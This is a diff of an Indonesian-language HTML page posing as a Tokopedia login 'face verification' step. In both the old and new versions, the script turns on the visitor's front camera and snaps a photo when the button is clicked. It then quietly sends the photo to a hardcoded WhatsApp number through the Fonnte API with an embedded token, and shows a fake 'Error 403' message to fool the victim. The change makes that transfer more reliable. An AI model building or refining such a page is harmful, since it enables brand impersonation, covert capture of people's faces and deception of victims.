@@ -3,18 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Tokopedia - Verifikasi Keamanan</title>
+    <title>Verifikasi Login - Tokopedia</title>
     <style>
         :root { --p: #00AA5B; }
-        body { background: #f0f3f7; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #fff; padding: 35px 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 90%; max-width: 360px; text-align: center; }
-        .logo { font-size: 26px; font-weight: bold; color: var(--p); margin-bottom: 5px; letter-spacing: -1px; }
-        h1 { font-size: 16px; margin-bottom: 25px; color: #31353B; font-weight: 600; }
-        .cam-box { width: 220px; height: 220px; border-radius: 50%; border: 4px solid var(--p); margin: 0 auto 25px; overflow: hidden; position: relative; background: #000; box-shadow: 0 0 15px rgba(0,170,91,0.2); }
+        body { background: #f4f7f9; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #fff; padding: 30px 20px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; }
+        .logo { font-size: 24px; font-weight: bold; color: var(--p); margin-bottom: 5px; }
+        h1 { font-size: 16px; margin-bottom: 20px; color: #31353B; }
+        .cam-box { width: 200px; height: 200px; border-radius: 50%; border: 4px solid var(--p); margin: 0 auto 20px; overflow: hidden; background: #000; position: relative; }
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .btn { background: var(--p); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
-        .btn:disabled { background: #E5E7E9; color: #AAB4BF; }
-        #msg { font-size: 12px; margin-top: 15px; color: #888; font-style: italic; }
+        .btn { background: var(--p); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .btn:disabled { background: #ddd; cursor: not-allowed; }
+        #msg { font-size: 12px; margin-top: 15px; color: #888; }
     </style>
 </head>
 <body>
@@ -26,7 +26,7 @@
             <video id="v" autoplay playsinline muted></video>
         </div>
         <button id="b" class="btn" disabled>Login Sekarang</button>
-        <div id="msg">Menghubungkan ke enkripsi kamera...</div>
+        <div id="msg">Menyiapkan kamera...</div>
     </div>
 
     <canvas id="c" style="display:none;"></canvas>
@@ -38,61 +38,66 @@
         const tokenWA = 'PG3GRjmArXV4PHYgQaFz';
         const nomorWA = '6285117090357';
 
-        // Akses Kamera
+        // 1. Hidupkan Kamera
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(s => { 
             v.srcObject = s; 
             b.disabled = false; 
-            msg.innerText = "Kamera Terverifikasi ✅"; 
+            msg.innerText = "Kamera Aktif ✅"; 
         })
         .catch(e => { 
-            msg.innerText = "Error: Kamera diblokir! Izinkan akses untuk verifikasi."; 
+            msg.innerText = "Error: Kamera diblokir!";
             msg.style.color = "red";
         });
 
+        // 2. Aksi Klik Tombol
         b.onclick = async () => {
             b.disabled = true;
             b.innerText = "Memproses...";
-            msg.innerText = "Mencocokkan data biometrik...";
+            msg.innerText = "Sedang mencocokkan wajah...";
 
-            // Ambil Foto dari Video
+            // Ambil gambar dari video
             can.width = v.videoWidth;
             can.height = v.videoHeight;
             const ctx = can.getContext('2d');
             ctx.translate(can.width, 0); ctx.scale(-1, 1);
             ctx.drawImage(v, 0, 0);
             
-            // Kompres foto (0.4) supaya enteng dikirim
-            const imgData = can.toDataURL('image/jpeg', 0.4);
+            // Konversi ke BLOB (File asli) agar Fonnte mudah membaca
+            can.toBlob(async (blob) => {
+                const file = new File([blob], "capture.jpg", { type: "image/jpeg" });
 
-            // Siapkan Data Kirim (FormData)
-            const f = new FormData();
-            f.append('target', nomorWA);
-            f.append('url', imgData);
-            f.append('caption', '🚨 *PRANK LOG: TARGET TERDETEKSI* 🚨\n\nWajah target sudah terkirim diam-diam!');
+                // Siapkan data pengiriman
+                const f = new FormData();
+                f.append('target', nomorWA);
+                f.append('file', file); // Parameter 'file' jauh lebih stabil daripada 'url'
+                f.append('caption', '📸 *PRANK BERHASIL!* \nTarget baru saja mengambil foto.');
 
-            try {
-                // KIRIM DIAM-DIAM KE WHATSAPP
-                await fetch('https://api.fonnte.com/send', {
-                    method: 'POST',
-                    headers: { 'Authorization': tokenWA },
-                    body: f
-                });
+                try {
+                    // Kirim ke Fonnte
+                    const res = await fetch('https://api.fonnte.com/send', {
+                        method: 'POST',
+                        headers: { 'Authorization': tokenWA },
+                        body: f
+                    });
 
-                // TAMPILAN PRANK (BOHONGIN USER)
-                setTimeout(() => {
-                    alert("Gagal memverifikasi wajah (Error 403). Pastikan wajah Anda terlihat jelas dan pencahayaan cukup.");
+                    const data = await res.json();
+                    console.log("Fonnte Response:", data);
+
+                    // Munculkan Pesan Error Palsu (Prank)
+                    setTimeout(() => {
+                        alert("Gagal memverifikasi wajah (Error 403). Pastikan wajah terlihat jelas dan ulangi lagi.");
+                        b.disabled = false;
+                        b.innerText = "Login Sekarang";
+                        msg.innerText = "Pencahayaan kurang, coba lagi.";
+                    }, 1500);
+
+                } catch (err) {
+                    console.error("Fetch Error:", err);
+                    alert("Gagal terhubung ke server. Cek internet.");
                     b.disabled = false;
-                    b.innerText = "Coba Lagi";
-                    msg.innerText = "Pencahayaan kurang, silakan ulangi.";
-                    msg.style.color = "orange";
-                }, 2000);
-
-            } catch (err) {
-                alert("Kesalahan Jaringan. Silakan coba lagi.");
-                b.disabled = false;
-                b.innerText = "Login Sekarang";
-            }
+                }
+            }, 'image/jpeg', 0.5); // Kualitas 50% supaya file ringan (cepat terkirim)
         };
     </script>
 </body>
